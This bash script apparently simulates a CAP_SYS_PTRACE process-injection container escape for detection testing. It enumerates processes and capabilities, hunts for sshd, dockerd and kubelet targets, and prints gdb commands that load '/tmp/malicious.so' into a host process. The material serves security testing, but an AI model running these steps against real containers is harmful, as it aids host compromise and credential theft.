#!/bin/bash
# Attack: CAP_SYS_PTRACE Process Injection
# MITRE ATT&CK: Privilege Escalation - T1055, Defense Evasion - T1055
# Severity: HIGH
# Description: Uses CAP_SYS_PTRACE capability to inject code into host processes
# Prerequisites: Container must have CAP_SYS_PTRACE capability

set -e
echo "[+] Starting: CAP_SYS_PTRACE Process Injection"
echo "[+] MITRE ATT&CK: T1055 - Process Injection"
echo "[+] Severity: HIGH"
echo ""

echo "[*] Step 1: Checking for CAP_SYS_PTRACE capability..."
if command -v capsh &> /dev/null; then
    capsh --print | grep -i cap_sys_ptrace && echo "[+] CAP_SYS_PTRACE present!" || echo "[!] CAP_SYS_PTRACE not found"
else
    echo "[*] Checking capabilities via /proc:"
    grep "^Cap" /proc/self/status
fi

echo ""
echo "[*] Step 2: Understanding CAP_SYS_PTRACE..."
echo "[*] This capability allows:"
echo "    - Trace arbitrary processes with ptrace()"
echo "    - Read/write process memory"
echo "    - Inject code into processes"
echo "    - Bypass YAMA ptrace_scope restrictions"

echo ""
echo "[*] Step 3: Enumerating accessible processes..."
echo "[*] Container processes:"
ps aux | head -10

echo ""
echo "[*] Step 4: Checking for host PID namespace access..."
if [ -d /proc/1 ]; then
    INIT_CMDLINE=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ')
    echo "[*] PID 1 command: $INIT_CMDLINE"

    if echo "$INIT_CMDLINE" | grep -q "systemd\|init"; then
        echo "[+] Can see host PID namespace!"
    else
        echo "[!] PID 1 is container init"
    fi
fi

echo ""
echo "[*] Step 5: Process injection technique..."
echo "[*] With CAP_SYS_PTRACE, attacker would:"
echo ""
echo "    # Find target process (e.g., host sshd)"
echo "    TARGET_PID=\$(ps aux | grep sshd | grep -v grep | awk '{print \$2}' | head -1)"
echo ""
echo "    # Inject shellcode using ptrace"
echo "    gdb -p \$TARGET_PID"
echo "    (gdb) call dlopen(\"/tmp/malicious.so\", 2)"
echo "    (gdb) detach"
echo "    (gdb) quit"

echo ""
echo "[*] Step 6: Alternative - Memory dumping..."
echo "[*] Reading process memory:"
if [ -r /proc/self/maps ]; then
    echo "[+] Can read process memory maps:"
    head -5 /proc/self/maps
fi

echo ""
echo "[*] Step 7: Searching for sensitive processes..."
echo "[*] Looking for high-value targets:"
ps aux | grep -E "sshd|dockerd|kubelet|systemd" | grep -v grep | head -5 || echo "[*] No sensitive processes visible"

echo ""
echo "[*] Step 8: Demonstrating ptrace capability..."
if command -v strace &> /dev/null; then
    echo "[*] Testing strace (uses ptrace):"
    timeout 2 strace -e trace=open ls / 2>&1 | head -10 || echo "[*] strace test completed"
else
    echo "[!] strace not available for testing"
fi

echo ""
echo "[✓] CAP_SYS_PTRACE injection simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Inject malicious code into host processes"
echo "    - Steal credentials from process memory"
echo "    - Hijack process execution flow"
echo "    - Dump sensitive data from memory"
echo "    - Bypass application security controls"
echo ""
echo "[!] Expected detections:"
echo "    - Container with CAP_SYS_PTRACE"
echo "    - ptrace() syscalls from container"
echo "    - Process injection attempts"
echo "    - Memory access violations"
